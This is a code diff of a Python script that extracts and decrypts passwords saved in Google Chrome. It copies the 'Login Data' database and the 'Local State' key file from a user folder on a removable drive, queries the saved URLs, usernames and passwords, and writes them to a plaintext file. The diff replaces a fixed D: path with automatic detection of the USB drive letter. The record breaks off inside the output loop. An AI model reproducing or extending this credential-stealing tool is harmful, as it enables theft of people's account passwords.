@@ -1,21 +1,26 @@
 
-import sys, sqlite3,shutil, win32crypt, json, base64
+import sys, sqlite3,shutil, win32crypt, json, base64, subprocess
 from Crypto.Cipher import AES
 
 
 user = sys.argv[1]
 
-logdata_path = "D:/" + user + "/Login Data"
-shutil.copy2(logdata_path, "D:/"+user+"/Loginvault.db")
+subprocess = subprocess.Popen("wmic logicaldisk where drivetype=2 get deviceid", shell=True, stdout=subprocess.PIPE)
+subprocess_return = subprocess.stdout.read().decode("utf-8")
+drive = subprocess_return[subprocess_return.index(":")-1] + ":"
+
+
+logdata_path = drive + "/" + user + "/Login Data"
+shutil.copy2(logdata_path, drive + "/" +user+"/Loginvault.db")
 
 #Connect to sqlite database
-conn = sqlite3.connect("D:/"+user+"/Loginvault.db")
+conn = sqlite3.connect(drive + "/" + user + "/Loginvault.db")
 cursor = conn.cursor()
 
 
 try:
     #(1) Get secretkey from chrome local state
-    with open( "D:/" + user + "/Local State", "r", encoding='utf-8') as f:
+    with open( drive + "/" + user + "/Local State", "r", encoding='utf-8') as f:
         local_state = f.read()
         local_state = json.loads(local_state)
     secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
@@ -27,7 +32,7 @@ except Exception as e:
     print("[ERR] Chrome secretkey cannot be found")
 
 
-f = open("D:/" + user  + "/PlainTextLOL.txt", "w")
+f = open(drive + "/" + user  + "/PlainTextLOL.txt", "w")
 
 cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 for index,login in enumerate(cursor.fetchall()):
